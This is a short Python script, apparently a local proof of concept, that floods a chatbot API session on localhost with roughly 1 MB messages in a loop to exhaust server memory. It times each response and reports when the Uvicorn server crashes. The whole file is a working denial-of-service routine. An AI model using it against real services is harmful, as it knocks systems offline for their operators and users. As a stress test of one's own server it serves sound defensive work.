import requests
import time
import sys

if len(sys.argv) < 2:
    print("Usage: python oom_nuke.py <SESSION_ID>")
    sys.exit(1)

session_id = sys.argv[1]
url = f"http://127.0.0.1:8000/api/chatbot/sessions/{session_id}/message"

# Generate a massive string (approx 1 Megabyte of text)
# Every time we send this, the server permanently stores it in RAM for this session.
heavy_text = "CRASH_TEST_DUMMY " * 50000 

print(f"[*] Locking onto Session: {session_id}")
print("[*] Initiating Context Window Crusher...")
print("[*] OPEN YOUR MAC'S ACTIVITY MONITOR NOW. Watch the Python process.\n")

for i in range(1, 100):
    start_time = time.time()
    
    # We send the massive payload
    payload = {"message": f"Injection #{i}:\n{heavy_text}"}
    
    try:
        response = requests.post(url, json=payload)
        elapsed = time.time() - start_time
        
        # We monitor the response time. As the list grows, serialization 
        # and memory allocation will make the server slower and slower.
        print(f"[+] Injection {i:03} | Status: {response.status_code} | Response Time: {elapsed:.2f} seconds")
        
    except requests.exceptions.ConnectionError:
        print("\n[💀] BOOM! Connection Refused. The Uvicorn server has crashed!")
        break
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        break